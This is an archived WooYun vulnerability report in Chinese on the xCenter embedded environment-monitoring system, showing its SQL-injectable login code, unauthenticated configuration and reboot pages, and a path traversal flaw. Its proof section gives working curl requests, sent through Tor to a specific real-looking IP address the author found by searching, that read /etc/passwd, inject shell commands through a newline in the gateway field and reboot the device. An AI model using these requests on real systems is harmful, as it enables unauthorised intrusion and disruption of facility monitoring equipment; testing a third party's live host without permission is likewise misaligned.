{"id": 43337, "wybug_id": "wooyun-2014-083044", "wybug_title": "xCenter环境动力监控系统多个漏洞导致可getshell/命令执行", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Snake", "wybug_date": "2014-11-13 10:18", "wybug_open_date": "2014-11-18 10:20", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "认证设计不合理", "设计缺陷", "搞笑有爱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 烟台吉安电子出品的xCenter嵌入式环境动力监控主机和平台存在多个漏洞，导致可getshell,命令执行，直接root权限。 详细说明：  1.登陆页面无任何过滤导致可sql注入，配合sqlite3等特性可以注入登录，可getshell。//  ejs/login.ejs\n<%@ include \"writeLog.ejs\"%><%\tvar UserName = params[\"username\"];\t\t\t\t\t\tvar PassWord = params[\"password\"];\t\tvar db = Sqlite(MapPath(\"a/db/config.db\"));\t\t\t\t\tvar sql=\"select uname,upassword,permission from TB_USER where uname='\" + UserName + \"' and upassword='\" + PassWord + \"';\";\tvar retArrLen=db.query(sql);\t\tdb.close();\tif(retArrLen.length > 0)\t{\t\t\t\t\t\t\t\tcontroller.session[\"uname\"] =retArrLen[0][\"uname\"];\t\t//session赋值\t\tcontroller.session[\"role\"] = retArrLen[0][\"permission\"];\t\t\tWriteLog(\"登陆系统！\");\t\t\t\t\t\t\twrite(\"ok;\"+retArrLen[0][\"permission\"]);\t}\telse\t{\t\t\t\t\t\t\t\t\t\t\twrite(\"no\");\t}%>\n2.多个功能页面无验证登录状态，可以直接访问.//  ejs/networkConfig.ejs\n<%@ include \"writeLog.ejs\"%><%\tvar action = params[\"action\"];\tvar ipAddr = params[\"ipaddr\"];\tvar subMask = params[\"submask\"];\tvar gateWay = params[\"gateway\"];\tFile f = new File(\"/usr/network/ifcfg-eth0\");\tif(action == \"init\"){\t\tf.open();\t\tvar s = f.readString();\t\twrite(s);\t}else if(action == \"update\"){\t   \t\tvar str = \"ifconfig eth0 \" + ipAddr + \" netmask \" + subMask + \" up\\n\";\t\tstr += \"route add default gw \" + gateWay;\t\tf.open(\"w\");\t\tvar co = f.write(str);\t\twrite(\"1\");\t\t WriteLog(\"将ip设置为\"+ipAddr+\",子网掩码\"+subMask+\",默认网关\"+gateWay);\t}\tf.close();%>\n// ejs/rebootsystem.ejs\n<%\tCmd.sh(\"reboot\");//重启linux系统%>\n3.egi/download.egi 没有进行过滤导致敏感文件下载curl http://www.target.com/egi/download.egi?name=/../../../etc/passwd   漏洞证明：  官方的demo阉割了很多功能，那就随便google一个做测试。\ncurl --socks5 127.0.0.1:9150 \"http://123.233.241.233/egi/download.egi?name=/../../../etc/passwd\"curl --socks5 127.0.0.1:9150 \"http://123.233.241.233/ejs/networkConfig.ejs?action=update\" --data \"ipaddr=192.168.1.108&submask=255.255.255.0&gateway=192.168.1.1%0Aecho \\`whoami\\`\\\" hackit \\\"\\`uname -a\\` >/tmp/hack\"curl --socks5 127.0.0.1:9150 \"http://123.233.241.233/egi/download.egi?name=/../../../usr/network/ifcfg-eth0\"curl --socks5 127.0.0.1:9150 \"http://123.233.241.233/ejs/rebootsystem.ejs\"curl --socks5 127.0.0.1:9150 \"http://123.233.241.233/egi/download.egi?name=/../../../tmp/hack\"\n\n\n   修复方案：  你们懂的   版权声明：转载请注明来源 Snake@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-18 10:20 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}